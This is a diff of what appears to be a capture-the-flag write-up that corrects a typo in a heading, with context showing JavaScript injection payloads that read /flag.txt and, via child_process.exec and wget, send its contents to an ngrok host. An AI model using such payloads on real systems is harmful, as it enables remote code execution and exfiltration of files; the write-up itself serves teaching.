@@ -14,7 +14,7 @@ The easiest way is to use the fs module.
    require('fs').readFileSync('/flag.txt', 'utf8')
 
 
-## Another Way To Exploit Using Ngrok Revrse Flag
+## Another Way To Exploit Using Ngrok Reverse Flag
 
 ```javascript
 require('child_process').exec('wget https://fsr2-a3f2-v01v-b337-7100-212f-5c22-ecar-g5ar.ngrok-free.app?flag=$(cat /flag.txt)')
